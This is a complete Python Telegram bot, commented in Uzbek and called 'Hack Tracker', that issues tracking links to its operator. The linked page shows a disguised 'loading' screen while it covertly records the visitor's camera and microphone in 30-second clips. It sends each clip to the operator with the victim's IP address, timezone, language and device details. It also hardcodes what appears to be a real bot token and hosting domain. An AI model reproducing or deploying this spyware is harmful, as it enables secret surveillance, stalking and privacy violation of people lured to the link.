#!/usr/bin/env python3
import os
import uuid
import base64
import asyncio
import logging
from io import BytesIO
import json
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# === SOZLAMALAR ===
BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "fit-roanna-runex-7a8db616.koyeb.app").strip().rstrip('/')
PORT = int(os.getenv("PORT", "8000"))

if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
    raise ValueError("❌ BOT_TOKEN muhit o'zgaruvchisini kiriting!")

if not WEBHOOK_DOMAIN:
    raise ValueError("❌ WEBHOOK_DOMAIN muhit o'zgaruvchisini kiriting!")

USER_TOKENS = {}

# === /start handler ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "🕵️‍♂️ **Maxfiy kuzatuv**\n\n"
        f"🔗 [Bosing: {link}]({link})\n\n"
        "Sahifa ochilgach:\n"
        "✅ Kamera + mikrofon ruxsati berilsa → **har 30 soniyada video (ovozli)** yuboriladi\n"
        "❌ Rad etilsa → faqat qurilma ma'lumotlari yuboriladi"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

# === IP manzilini olish ===
def get_client_ip(request: web.Request) -> str:
    hdr = request.headers.get("X-Forwarded-For")
    if hdr:
        return hdr.split(",")[0].strip()
    rem = request.remote
    if rem:
        return rem
    peer = request.transport.get_extra_info("peername")
    if peer:
        return str(peer[0])
    return "Noma'lum"

# === Sahifa HTML ===
async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Yuklanmoqda...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .loader {{
      width: 40px; height: 40px;
      border: 4px solid #ddd;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .note {{ font-size: 0.9em; color: #777; }}
  </style>
</head>
<body>
  <h2>Iltimos, kuting...</h2>
  <div class="loader"></div>
  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
  <script>
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let intervalId = null;

    async function collectData() {{
      return {{
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: navigator.languages?.join(', ') || navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || "Noma'lum",
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        screen: `${{screen.width}}x${{screen.height}}`,
        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
        browser: "Noma'lum",
        os: "Noma'lum",
        model: "Noma'lum",
        devices: {{ mic: 0, speaker: 0, camera: 0 }},
        gpu: "Noma'lum",
        network: "Noma'lum"
      }};
    }}

    async function sendVideo(videoBlob, data) {{
      const formData = new FormData();
      formData.append("token", "{token}");
      formData.append("clientData", JSON.stringify(data));
      if (videoBlob) {{
        const file = new File([videoBlob], "recording.webm", {{ type: "video/webm" }});
        formData.append("video", file);
      }}
      try {{
        await fetch("/submit", {{ method: "POST", body: formData }});
      }} catch (e) {{
        console.error("Yuborish xatosi:", e);
      }}
    }}

    function startRecording() {{
      if (!stream) return;
      recordedChunks = [];
      const options = {{ mimeType: 'video/webm;codecs=vp9,opus' }};
      if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
        options.mimeType = 'video/webm';
      }}
      mediaRecorder = new MediaRecorder(stream, options);
      mediaRecorder.ondataavailable = e => {{
        if (e.data.size > 0) recordedChunks.push(e.data);
      }};
      mediaRecorder.onstop = async () => {{
        if (recordedChunks.length === 0) return;
        const blob = new Blob(recordedChunks, {{ type: 'video/webm' }});
        const data = await collectData();
        await sendVideo(blob, data);
        recordedChunks = [];
        if (stream) startRecording(); // Keyingi sikl
      }};
      mediaRecorder.start();
      intervalId = setTimeout(() => {{
        if (mediaRecorder && mediaRecorder.state === "recording") {{
          mediaRecorder.stop();
        }}
      }}, 30000); // 30 SONIYA
    }}

    async function startStream() {{
      try {{
        // ✅ KAMERA + MIKROFON
        stream = await navigator.mediaDevices.getUserMedia({{
          video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
          audio: true
        }});
        startRecording();
      }} catch (err) {{
        console.warn("Ruxsat rad etildi:", err);
        const data = await collectData();
        await sendVideo(null, data);
        try {{
          await fetch("/camera_denied", {{
            method: "POST",
            headers: {{ "Content-Type": "application/json" }},
            body: JSON.stringify({{ token: "{token}" }})
          }});
        }} catch (e) {{}}
      }}
    }}

    function stopAll() {{
      if (intervalId) clearTimeout(intervalId);
      if (mediaRecorder && mediaRecorder.state === "recording") {{
        mediaRecorder.stop();
      }}
      if (stream) {{
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }}
    }}

    window.addEventListener('beforeunload', stopAll);
    window.addEventListener('pagehide', stopAll);

    startStream();
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

# === Ma'lumot yoki video qabul qilish ===
# === Ma'lumot yoki video qabul qilish ===
# === Ma'lumot yoki video qabul qilish ===
async def submit_data(request: web.Request):
    try:
        reader = await request.multipart()
        token = None
        client_data = {}
        video_data = None

        async for field in reader:
            if field.name == "token":
                token = (await field.read()).decode()
            elif field.name == "clientData":
                client_data = json.loads((await field.read()).decode())
            elif field.name == "video":
                video_data = await field.read()

        user_id = USER_TOKENS.get(token)
        if not user_id:
            return web.Response(status=403)

        ip = get_client_ip(request)
        devs = client_data.get("devices", {})

        message = (
            f"🕒 Vaqt: {client_data.get('timestamp')}\n"
            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
            f"📍 IP: {ip}\n"
            f"📱 Qurilma: {client_data.get('deviceType')}\n"
            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Kamera: {devs.get('camera',0)}\n"
            f"🗣 Tillar: {client_data.get('languages')}"
        )

        if video_data:
            try:
                video_file = BytesIO(video_data)
                video_file.name = "recording.webm"
                await request.app["bot"].send_video(
                    chat_id=user_id,
                    video=InputFile(video_file),
                    caption=message,
                    supports_streaming=True
                )
            except Exception as e:
                logger.exception("Videoni yuborishda xato")
                await request.app["bot"].send_message(
                    chat_id=user_id,
                    text=f"⚠️ Video yuborishda xato: {str(e)[:100]}"
                )
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message)

        return web.Response(text="ok")

    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500)


# === Kamera rad etilganda ===
async def camera_denied(request: web.Request):
    try:
        data = await request.json()
        token = data.get("token")
        user_id = USER_TOKENS.get(token)
        if user_id:
            await request.app["bot"].send_message(
                chat_id=user_id,
                text="⚠️ Kamera yoki mikrofon ruxsati berilmadi."
            )
        return web.Response(status=200)
    except Exception as e:
        logger.exception("camera_denied xato")
        return web.Response(status=500)

# === Web server ===
async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    app.router.add_post("/camera_denied", camera_denied)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{PORT}")

# === Startup ===
async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

# === Asosiy funksiya ===
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    logger.info("🕵️‍♂️ Hack Tracker bot ishga tushdi!")
    app.run_polling()

if __name__ == "__main__":
    main()
